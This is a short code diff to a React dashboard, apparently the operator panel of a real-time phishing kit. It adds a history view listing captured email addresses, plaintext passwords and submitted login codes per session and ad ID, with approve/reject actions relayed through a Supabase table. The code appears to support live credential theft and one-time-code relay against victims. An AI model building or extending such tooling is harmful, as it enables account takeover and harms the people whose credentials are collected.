@@ -484,6 +484,24 @@ export default function Dashboard() {
     };
   }, [leads, nowTick]);
 
+  // Sessões abandonadas (>1h sem atividade) viram linhas no Histórico,
+  // mesmo sem código submetido — preenchem com "—".
+  const history: AttemptRow[] = useMemo(() => {
+    const stale: AttemptRow[] = staleSessions.map((s) => ({
+      key: `stale-${s.session_id}-${s.lastActivity}`,
+      session_id: s.session_id,
+      ad_id: s.ad_id,
+      email: s.email,
+      password: s.password,
+      code: "—",
+      codeAt: s.lastActivity,
+      status: "reject",
+    }));
+    return [...historyFromAttempts, ...stale].sort((a, b) =>
+      b.codeAt.localeCompare(a.codeAt),
+    );
+  }, [historyFromAttempts, staleSessions]);
+
   const send = async (row: AttemptRow, action: "approve" | "reject") => {
     setBusy(`${row.key}-${action}`);
     const { error } = await supabase.from("ad_session_actions").insert({
